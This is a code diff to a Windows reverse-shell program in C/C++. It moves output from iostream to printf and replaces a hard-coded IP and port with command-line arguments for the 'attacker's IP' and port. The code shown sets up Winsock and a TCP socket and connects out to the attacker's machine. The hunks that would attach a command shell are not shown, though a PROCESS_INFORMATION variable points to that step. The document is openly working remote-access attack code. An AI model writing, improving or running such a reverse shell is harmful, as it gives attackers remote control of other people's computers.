@@ -1,10 +1,10 @@
-#include <iostream>
+#include <stdio.h>
+#include <stdlib.h>
 #include <WinSock2.h>
 #include <WS2tcpip.h>
 #include <ws2ipdef.h>
 #pragma comment(lib, "ws2_32.lib")
 
-using namespace std;
 
 void get_error()
 {
@@ -13,11 +13,11 @@ void get_error()
 		NULL, WSAGetLastError(),
 		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
 		(LPWSTR)&s, 0, NULL);
-	wcout << s;
+	printf("%ls\n", s);
 	LocalFree(s);
 }
 
-int main(int argc, char* argv[]) 
+int main(int argc, char* argv[])
 {
 	WSADATA wsa;
 	SOCKET sock = INVALID_SOCKET;
@@ -25,13 +25,22 @@ int main(int argc, char* argv[])
 	PROCESS_INFORMATION pi;
 	sockaddr_in sin;
 
-	// Target IP and port
-	char target_ip[20] = "192.168.1.13";	// Change this
-	int port = 7777;	// Change this
+	// Check user input
+	if (argc != 3) {
+		printf("Usage: %s <attacker's IP> <port>\n", argv[0]);
+		printf("Examples:\n");
+		printf("\t%s 127.0.0.1 7777\n", argv[0]);
+		printf("\t%s 192.168.1.10 8080\n", argv[0]);
+		exit(0);
+	}
+
+	// Attacker IP and port
+	char* ip = argv[1];
+	int port = atoi(argv[2]);
 
 	// Load Winsock 2 dll
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-		cout << "Failed to load Winsock dll. ";
+		printf("Failed to load Winsock dll. ");
 		get_error();
 		exit(0);
 	}
@@ -39,18 +48,18 @@ int main(int argc, char* argv[])
 	// Create socket
 	sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 	if (sock == INVALID_SOCKET) {
-		cout << "Failed to create socket. ";
+		printf("Failed to create socket. ");
 		get_error();
 		exit(0);
 	}
 
 	sin.sin_family = AF_INET;
 	sin.sin_port = htons(port);
-	inet_pton(AF_INET, target_ip, &sin.sin_addr.s_addr);
+	inet_pton(AF_INET, ip, &sin.sin_addr.s_addr);
 
-	// Connect to target server
+	// Connect to attacker machine
 	if (WSAConnect(sock, (SOCKADDR*)&sin, sizeof(sin), NULL, NULL, NULL, NULL) == INVALID_SOCKET) {
-		cout << "Failed to connect to server. ";
+		printf("Failed to connect to server. ");
 		get_error();
 		exit(0);
 	}
@@ -71,3 +80,4 @@ int main(int argc, char* argv[])
 
 	return 0;
 }
+
